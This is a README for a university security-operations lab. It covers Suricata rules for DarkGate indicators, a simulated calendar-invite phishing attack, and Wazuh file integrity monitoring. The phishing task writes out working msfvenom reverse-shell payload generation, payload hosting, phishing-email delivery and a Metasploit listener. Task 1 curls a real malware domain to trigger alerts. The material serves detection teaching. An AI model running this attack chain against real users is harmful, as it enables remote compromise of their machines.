# SIEM Security Labs — CSE804: Network and Internet Security

> **University of Dhaka — Professional Masters in Information and Cyber Security**  
> Course: CSE804

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Ubuntu%2022.04-orange.svg)]()
[![SIEM](https://img.shields.io/badge/SIEM-Wazuh%20%2B%20Elastic-005571.svg)]()
[![IDS](https://img.shields.io/badge/IDS-Suricata-EF3B2D.svg)]()

A hands-on security operations centre (SOC) lab covering three real-world threat detection scenarios:

| # | Task | Key Technology |
|---|------|----------------|
| 1 | [Custom Suricata Rule — DarkGate Malware Detection](#task-1-custom-suricata-rule--darkgate-malware-detection) | Suricata, Kibana, Elasticsearch |
| 2 | [Google Calendar Phishing Attack — Simulation & Detection](#task-2-google-calendar-phishing-attack) | Metasploit, Wazuh, `.ics` payload |
| 3 | [File Integrity Monitoring (FIM) via Wazuh](#task-3-file-integrity-monitoring-fim) | Wazuh FIM, syscheck, Ubuntu + Windows |

---

## Lab Environment

```
┌─────────────────────────────────────────────────────────┐
│                    SOC Infrastructure                   │
│                                                         │
│  ┌──────────────────┐    ┌──────────────────────────┐   │
│  │  Wazuh Manager   │    │  Kibana / Elasticsearch  │   │
│  │  Ubuntu 22.04    │    │  10.33.3.4:5601          │   │
│  │  IP: 10.33.3.4   │◄───┤  Filebeat + Suricata     │   │
│  └──────────────────┘    └──────────────────────────┘   │
│          ▲                                              │
│          │  Wazuh Agents                               │
│  ┌───────┴──────────────────────┐                      │
│  │                              │                      │
│  ▼                              ▼                      │
│ ┌─────────────┐         ┌─────────────┐               │
│ │ Ubuntu 20   │         │ Windows 11  │               │
│ │ 10.33.3.2   │         │ 10.33.3.7   │               │
│ │ Agent (FIM) │         │ Agent (FIM) │               │
│ └─────────────┘         └─────────────┘               │
│                                                         │
│  Attack Simulation (Task 2):                           │
│  Attacker: Kali Linux  10.33.3.49                      │
│  Victim:   Windows 10  10.33.3.50                      │
└─────────────────────────────────────────────────────────┘
```

### Prerequisites

```bash
# Clone this repository
git clone https://github.com/<your-username>/siem-security-labs.git
cd siem-security-labs

# Deploy the SOC stack (Elasticsearch + Kibana + Filebeat + Suricata + Wazuh)
# Uses the soc_setup project by samiul008ghub
git clone https://github.com/samiul008ghub/soc_setup
cd soc_setup && sudo bash setup.sh
```

Software requirements:

| Component | Version |
|-----------|---------|
| Ubuntu | 20.04 / 22.04 |
| Oracle VirtualBox | 7.x |
| Suricata | 8.0+ |
| Wazuh Manager | 4.x |
| Elasticsearch / Kibana | 8.x |
| Filebeat | 8.x |

---

## Task 1: Custom Suricata Rule — DarkGate Malware Detection

### Background

Based on the [Palo Alto Unit 42 DarkGate threat intel report](https://unit42.paloaltonetworks.com/darkgate-malware-uses-excel-files/), DarkGate malware uses AutoHotkey packages delivered via HTTP to compromise victims. This task creates Suricata rules that detect those network Indicators of Compromise (IOCs).

### Indicators of Compromise (IOCs)

| Date | Malicious URL | Type |
|------|--------------|------|
| Mar 12 2024 | `adfhjadfbjadbfjkhad44jka[.]com/aa` | AutoHotkey download |
| Mar 12 2024 | `adfhjadfbjadbfjkhad44jka[.]com/xxhhodrq` | AutoHotkey download |
| Mar 13 2024 | `nextroundst[.]com/aa` | AutoHotkey download |
| Mar 13 2024 | `nextroundst[.]com/ffcxlohx` | AutoHotkey download |
| Mar 15 2024 | `diveupdown[.]com/aa` | AutoHotkey download |
| Mar 15 2024 | `diveupdown[.]com/hlsxaifp` | AutoHotkey download |

### Step-by-Step

**Step 1 — Verify Suricata is running:**
```bash
sudo systemctl status suricata
```

**Step 2 — Deploy the custom DarkGate rules:**
```bash
sudo cp task1-suricata-darkgate/rules/darkgate.rules /var/lib/suricata/rules/darkgate.rules
```

**Step 3 — Register the rule file in `suricata.yaml`:**
```bash
sudo nano /etc/suricata/suricata.yaml
# Under rule-files: add:
#   - darkgate.rules
```

**Step 4 — Test the configuration:**
```bash
sudo suricata -T -c /etc/suricata/suricata.yaml -v
# Expected: "Configuration provided was successfully loaded."
```

**Step 5 — Restart Suricata:**
```bash
sudo systemctl restart suricata
```

**Step 6 — Trigger a test alert and view in Kibana:**
```bash
# Simulate a DNS lookup to one of the IOC domains
curl -v http://nextroundst.com/aa

# View logs
sudo tail -f /var/log/suricata/fast.log

# Or open Kibana → Filebeat Suricata → Alerts dashboard
# URL: https://10.33.3.4:5601
```

### Rule File

→ [`task1-suricata-darkgate/rules/darkgate.rules`](task1-suricata-darkgate/rules/darkgate.rules)

### What the Alerts Look Like

```
[**] [1:3001001:1] DARKGATE - GET to adfhjadfbjadbfjkhad44jka.com [**]
[Classification: A Network Trojan was detected] [Priority: 1]
07/12/2025-19:26:46 -> [1:3001001:1] ...

ET MALWARE DNS Query to Expiro Domain (nextroundst.com)
Classification: A Network Trojan was detected
```

---

## Task 2: Google Calendar Phishing Attack

### Attack Chain

```
Attacker (Kali 10.33.3.49)                    Victim (Windows 10 10.33.3.50)
        │                                              │
        │  1. Generate payload (msfvenom)              │
        │  2. Host rasd.exe on Apache                  │
        │  3. Craft malicious .ics calendar invite     │
        │  4. Send phishing email ──────────────────►  │
        │                                              │  5. Victim opens .ics
        │                                              │  6. Downloads rasd.exe
        │  ◄────────── Reverse TCP shell ──────────────│
        │  7. Meterpreter session opened               │
        │                                              │
        └── Detected by Wazuh (Rule 92217) ───────────►  Wazuh (10.33.3.4)
```

### Step-by-Step

**Step 1 — Generate the reverse shell payload:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.33.3.49 \
  LPORT=4444 \
  -f exe > rasd.exe
```

**Step 2 — Host payload on Apache:**
```bash
sudo mv rasd.exe /var/www/html/
sudo chmod 755 /var/www/html/rasd.exe
sudo systemctl start apache2
```

**Step 3 — Create the malicious calendar invite:**
```bash
# File contents in task2-google-calendar-attack/attacker/malicious_invite.ics
nano malicious_invite.ics
```

**Step 4 — Send the phishing email:**
```bash
# Edit credentials in the script first
nano task2-google-calendar-attack/attacker/send_calendar_invite.py
python3 send_calendar_invite.py
```

**Step 5 — Start Metasploit listener:**
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.33.3.49
set LPORT 4444
exploit
```

**Step 6 — Victim executes the invite → Meterpreter session opens:**
```
[*] Started reverse TCP handler on 10.33.3.49:4444
[*] Sending stage (175686 bytes) to 10.33.3.50
[*] Meterpreter session 1 opened (10.33.3.49:4444 → 10.33.3.50:52884)
meterpreter > getuid
Server username: DESKTOP-D7CIS06\nurea
```

### Wazuh Detection

| Field | Value |
|-------|-------|
| Rule ID | 92217 |
| Description | Executable dropped in Windows root folder |
| Tactic | Lateral Movement (T1570) |
| Rule Level | 8 |
| Agent | Dolon_Victim |

Navigate in Wazuh: **Modules → Security Events** → filter by agent `Dolon_Victim`

→ [`task2-google-calendar-attack/`](task2-google-calendar-attack/)

---

## Task 3: File Integrity Monitoring (FIM)

### What FIM Does

Wazuh's built-in `syscheck` module monitors the filesystem in real time, raising alerts for:

| Rule ID | Event |
|---------|-------|
| 550 | File added / integrity checksum changed |
| 553 | File modified |
| 554 | File deleted |

### Ubuntu Agent Configuration

**Step 1 — Edit the agent config:**
```bash
sudo nano /var/ossec/etc/ossec.conf
```

Add inside the `<syscheck>` block:
```xml
<directories check_all="yes" report_changes="yes" realtime="yes">/root</directories>
```

**Step 2 — Restart the agent:**
```bash
sudo systemctl restart wazuh-agent
```

→ Full config: [`task3-fim-wazuh/ubuntu/ossec_syscheck.conf`](task3-fim-wazuh/ubuntu/ossec_syscheck.conf)

### Windows Agent Configuration

**Step 1 — Install Wazuh agent via PowerShell:**
```powershell
Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.5.4-1.msi `
  -OutFile $env:tmp\wazuh-agent.msi
msiexec.exe /i $env:tmp\wazuh-agent.msi /q `
  WAZUH_MANAGER='10.33.3.4' WAZUH_AGENT_NAME='Ruhee'
NET START Wazuh
```

**Step 2 — Add FIM rule to `ossec.conf`:**
```xml
<directories check_all="yes" report_changes="yes" realtime="yes">
  C:\Users\student\Desktop
</directories>
```

**Step 3 — Restart agent:**
```powershell
Restart-Service -Name wazuh
```

→ Full config: [`task3-fim-wazuh/windows/ossec_syscheck.conf`](task3-fim-wazuh/windows/ossec_syscheck.conf)

### Testing FIM Alerts

```bash
# Ubuntu — create, modify, delete a file in the monitored directory
echo "test" > /root/fim_test.txt        # triggers rule 550 (added)
echo "modified" >> /root/fim_test.txt   # triggers rule 550 (checksum changed)
rm /root/fim_test.txt                   # triggers rule 554 (deleted)
```

**Kibana query to view alerts:**
```
rule.groups:syscheck AND rule.id:(550 OR 553 OR 554)
```

---

## Repository Structure

```
siem-security-labs/
├── README.md
├── LICENSE
├── .gitignore
│
├── task1-suricata-darkgate/
│   ├── rules/
│   │   └── darkgate.rules              # Custom Suricata rules (IOC-based)
│   ├── configs/
│   │   └── suricata_rule_path.yaml     # suricata.yaml rule-files snippet
│   └── docs/
│       └── darkgate_iocs.md            # IOC reference & rule explanation
│
├── task2-google-calendar-attack/
│   ├── attacker/
│   │   ├── malicious_invite.ics        # Malicious iCalendar file
│   │   └── send_calendar_invite.py     # Phishing email delivery script
│   ├── configs/
│   │   └── metasploit_handler.rc       # Metasploit resource script
│   └── docs/
│       └── attack_walkthrough.md       # Full attack chain explanation
│
├── task3-fim-wazuh/
│   ├── ubuntu/
│   │   └── ossec_syscheck.conf         # Ubuntu agent syscheck config
│   ├── windows/
│   │   └── ossec_syscheck.conf         # Windows agent syscheck config
│   └── docs/
│       └── fim_explained.md            # FIM rules, alerts & MITRE mapping
│
├── scripts/
│   ├── deploy_soc.sh                   # Automated SOC stack bootstrap
│   ├── test_suricata_rules.sh          # Validate Suricata rule syntax
│   └── verify_wazuh_agents.sh          # Check all agent connectivity
│
└── docs/
    ├── architecture.md                 # Lab network diagram & component roles
    ├── mitre_mapping.md                # MITRE ATT&CK technique mapping
    └── references.md                   # Threat intel sources & tools
```

---

## MITRE ATT&CK Coverage

| Task | Technique | Tactic | ID |
|------|-----------|--------|----|
| Task 1 | DarkGate C2 via AutoHotkey | Command & Control | T1071 |
| Task 2 | Phishing via Calendar Invite | Initial Access | T1566.001 |
| Task 2 | Meterpreter Reverse Shell | Execution | T1059 |
| Task 2 | Executable dropped in Windows root | Lateral Movement | T1570 |
| Task 3 | File creation / modification / deletion | Defense Evasion | T1565.001 |

---

## References

- [Palo Alto Unit 42 — DarkGate Malware Uses Excel Files](https://unit42.paloaltonetworks.com/darkgate-malware-uses-excel-files/)
- [SOC Setup (samiul008ghub)](https://github.com/samiul008ghub/soc_setup)
- [Wazuh FIM Documentation](https://documentation.wazuh.com/current/user-manual/capabilities/file-integrity/index.html)
- [Suricata Rule Writing Guide](https://suricata.readthedocs.io/en/latest/rules/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)

---

## Team RASD

| Name | Roll |
|------|------|
| Jannatul Ferdaus | 70011 |
| Rokeya Samanta Ruhee | 70057 |
| Sayma Mahmud | 70030 |
| Md. Nur-E-Alam | 70033 |

---

> ⚠️ **Disclaimer:** All attack simulations in this repository are conducted in isolated virtual lab environments for educational purposes only. Never run these techniques against systems you do not own or have explicit written permission to test.
